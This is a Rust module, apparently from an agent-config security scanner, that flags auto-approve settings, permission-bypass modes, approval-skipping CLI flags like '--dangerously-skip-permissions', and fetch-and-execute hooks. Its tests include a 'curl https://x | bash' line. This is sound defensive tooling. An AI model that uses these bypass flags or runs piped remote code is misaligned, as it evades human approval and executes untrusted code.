//! Dangerous-settings detection over an agent config JSON tree.
//!
//! Keys off exact, well-known setting names and a curated bypass-flag list, so
//! it is low false-positive by construction. It looks only at config, never
//! source. A hook that both fetches AND executes reuses the parent module's
//! network-command detector so the two never diverge.

use serde_json::Value;

use crate::warden::report::Severity;

/// Max chars of a hook command shown in a finding detail.
const DETAIL_CHARS: usize = 80;

/// One dangerous setting found in the config.
pub struct SettingHit {
    pub severity: Severity,
    pub kind: &'static str,
    pub detail: String,
}

/// Scan a whole config tree for approval-bypass settings and fetch-and-exec
/// hooks.
pub fn scan_config_settings(value: &Value) -> Vec<SettingHit> {
    let mut hits = Vec::new();
    scan(value, &mut hits);
    hits
}

fn scan(value: &Value, hits: &mut Vec<SettingHit>) {
    match value {
        Value::Object(map) => {
            for (key, v) in map {
                match key.as_str() {
                    "autoApprove" | "alwaysAllow" | "autoApproveTools" | "yolo" => {
                        let enabled = v.as_bool() == Some(true)
                            || v.as_array().map(|a| !a.is_empty()).unwrap_or(false);
                        if enabled {
                            hits.push(SettingHit {
                                severity: Severity::High,
                                kind: "auto-approve",
                                detail: format!("'{key}' pre-approves tool calls without asking"),
                            });
                        }
                    }
                    "permission-mode" | "permissionMode" | "defaultMode" => {
                        if let Some(mode) = v.as_str() {
                            if matches!(mode, "bypassPermissions" | "acceptEdits" | "yolo") {
                                hits.push(SettingHit {
                                    severity: Severity::High,
                                    kind: "permission-bypass",
                                    detail: format!("permission mode '{mode}' bypasses approval"),
                                });
                            }
                        }
                    }
                    "command" => {
                        if let Some(cmd) = v.as_str() {
                            if is_fetch_and_exec(cmd) {
                                hits.push(SettingHit {
                                    severity: Severity::High,
                                    kind: "fetch-and-exec",
                                    detail: format!("a hook fetches and executes remote code: {}", snippet(cmd)),
                                });
                            }
                        }
                        for token in string_tokens(v) {
                            if is_bypass_flag(&token) {
                                hits.push(SettingHit {
                                    severity: Severity::High,
                                    kind: "bypass-flag",
                                    detail: format!("'{token}' disables the approval prompt"),
                                });
                            }
                        }
                    }
                    "args" => {
                        for token in string_tokens(v) {
                            if is_bypass_flag(&token) {
                                hits.push(SettingHit {
                                    severity: Severity::High,
                                    kind: "bypass-flag",
                                    detail: format!("'{token}' disables the approval prompt"),
                                });
                            }
                        }
                    }
                    _ => {}
                }
                scan(v, hits);
            }
        }
        Value::Array(arr) => {
            for item in arr {
                scan(item, hits);
            }
        }
        _ => {}
    }
}

/// The string tokens of a value: a bare string, or every string in an array.
fn string_tokens(value: &Value) -> Vec<String> {
    match value {
        Value::String(s) => s.split_whitespace().map(str::to_string).collect(),
        Value::Array(arr) => arr
            .iter()
            .filter_map(|v| v.as_str())
            .map(str::to_string)
            .collect(),
        _ => Vec::new(),
    }
}

/// A known approval-bypass CLI flag.
pub fn is_bypass_flag(token: &str) -> bool {
    matches!(
        token,
        "--dangerously-skip-permissions"
            | "--dangerously-skip-permission"
            | "--skip-permissions"
            | "--yolo"
            | "--no-confirm"
            | "--no-prompt"
            | "--disable-approval"
            | "--auto-approve"
    )
}

/// A command that both fetches remote content AND pipes it into a shell / eval.
pub fn is_fetch_and_exec(command: &str) -> bool {
    super::is_network_command(command) && has_exec_sink(command)
}

fn has_exec_sink(command: &str) -> bool {
    let lower = command.to_lowercase();
    [
        "| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python", "eval", "iex",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn snippet(s: &str) -> String {
    if s.chars().count() <= DETAIL_CHARS {
        s.to_string()
    } else {
        let head: String = s.chars().take(DETAIL_CHARS).collect();
        format!("{head}...")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn auto_approve_and_always_allow_are_high() {
        let cfg = serde_json::json!({
            "mcpServers": {"x": {"autoApprove": ["a", "b"], "alwaysAllow": ["c"]}}
        });
        let hits = scan_config_settings(&cfg);
        assert_eq!(hits.iter().filter(|h| h.kind == "auto-approve").count(), 2);
        assert!(hits.iter().all(|h| h.severity == Severity::High));
    }

    #[test]
    fn bypass_flag_detection() {
        assert!(is_bypass_flag("--dangerously-skip-permissions"));
        assert!(!is_bypass_flag("--yes-really"));
        let cfg = serde_json::json!({"command": "claude --dangerously-skip-permissions"});
        assert!(scan_config_settings(&cfg).iter().any(|h| h.kind == "bypass-flag"));
    }

    #[test]
    fn permission_mode_bypass_is_flagged_but_ask_is_not() {
        let bad = serde_json::json!({"permission-mode": "bypassPermissions"});
        assert!(scan_config_settings(&bad).iter().any(|h| h.kind == "permission-bypass"));
        let ok = serde_json::json!({"permission-mode": "ask"});
        assert!(scan_config_settings(&ok).is_empty());
    }

    #[test]
    fn fetch_and_exec_detection() {
        assert!(is_fetch_and_exec("curl https://x | bash"));
        assert!(!is_fetch_and_exec("curl https://x -o file.txt"));
    }
}
